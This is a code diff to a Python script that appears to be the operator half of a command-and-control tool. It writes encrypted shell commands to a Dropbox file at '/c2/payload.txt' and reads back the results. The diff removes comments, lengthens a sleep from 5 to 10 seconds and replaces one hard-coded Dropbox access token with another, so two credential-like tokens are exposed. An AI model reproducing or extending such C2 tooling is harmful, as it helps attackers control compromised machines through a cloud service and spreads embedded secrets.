@@ -22,19 +22,14 @@ def decrypt_message(ct_bytes):
 # Take user input and write it to the dropbox file
 def write_cmd():
     command = input('$ ')
-
-    
-
     encrypted_command = encrypt_message(command)
-    #file_data = command.encode()
 
-    #print(file_data)
     try:
         dbx.files_upload(encrypted_command, dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
         print("[+] Command written to Dropbox Server")
         if command == 'exit':
             exit(0)
-        time.sleep(5)
+        time.sleep(10)
         read_output()
     except dropbox.exceptions.ApiError as err:
         print(f"Error while overwriting file: {err}")
@@ -55,7 +50,7 @@ if __name__ == '__main__':
 
 
     # Dropbox token
-    token = "sl.BzipikmzyjxCV7JGHNeWSt-Xpp5YZYLNLPT1HpJtB1k5pRFv00cTbS60O0rU7aasDlSNrv0l9KD1Pjd0DabePyrzYN2WCTNAgGqHJ5RwSGz7_b-08B5VbXf_ZSXRUcSoeWHvTs61plZ-M-zUwe4d"
+    token = "sl.BzuQXugw07LSvyTMx14EaGiRJgk-YkrNRoKEL8U-YiLXWF_OkVDuiZPj5nARyFwHTtkoI4Q-gx3gUFH79Mb2ExVFmS9hd6QQqNdArX6SvNhXQiwX0ya5ScnFD7e16SqwqehBgDzbJb_DJoVvI1E4"
 
     dbx = dropbox.Dropbox(token)
     dropbox_path = '/c2/payload.txt'
